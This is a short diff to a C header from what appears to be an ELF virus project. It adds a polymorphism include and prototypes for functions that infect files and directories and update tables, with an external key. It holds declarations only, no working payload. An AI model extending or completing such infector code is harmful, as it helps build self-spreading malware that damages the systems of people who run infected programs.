@@ -7,6 +7,7 @@
 # include "elf64.h"
 # include <elf.h>
 # include <stdio.h>
+# include "poly.h"
 
 
 extern char key[16];
@@ -45,7 +46,10 @@ typedef struct s_infect_params {
 	size_t modif_table_len_off;
 } InfectParams;
 
-int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
-int infect(char *fname, char *outname, struct s_infect_params p, struct s_opt opt);
+int			infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
+int			infect(char *fname, char *outname, struct s_infect_params p, struct s_opt opt);
+void		update_tables(unsigned char *b, size_t len, struct s_infect_params p);
+
+extern uint32_t ft_rand();
 
 #endif
